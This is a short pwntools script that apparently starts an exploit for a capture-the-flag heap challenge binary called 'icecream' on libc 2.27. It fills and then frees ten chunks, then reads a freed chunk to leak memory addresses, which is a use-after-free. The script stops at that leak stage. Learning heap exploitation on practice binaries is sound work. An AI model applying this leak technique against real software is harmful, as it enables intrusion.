from pwn import *

context(arch = "amd64", os = "linux", log_level = "Debug")
io = process("./icecream")
e = ELF("./libc-2.27.so")
gdb.attach(io)

def add(size):
    io.recvuntil("exit")
    io.sendline("1")
    io.recvuntil("buy?")
    io.sendline(str(size))
    
def delete(idx):
    io.recvuntil("exit")
    io.sendline("2")
    io.recvuntil("delete?")
    io.sendline(str(idx))
    
def view(idx):
    io.recvuntil("exit")
    io.sendline("3")
    io.recvuntil("view?")
    io.sendline(str(idx))
    io.recvline()
    
def edit(idx, string):
    io.recvuntil("exit")
    io.sendline("4")
    io.recvuntil("edit?")
    io.sendline(str(idx))
    io.recvuntil("byte")
    io.sendline(string)
    
for i in range(10):
    add(200)

for i in range(10):
    delete(i)

view(8)
io.recvall()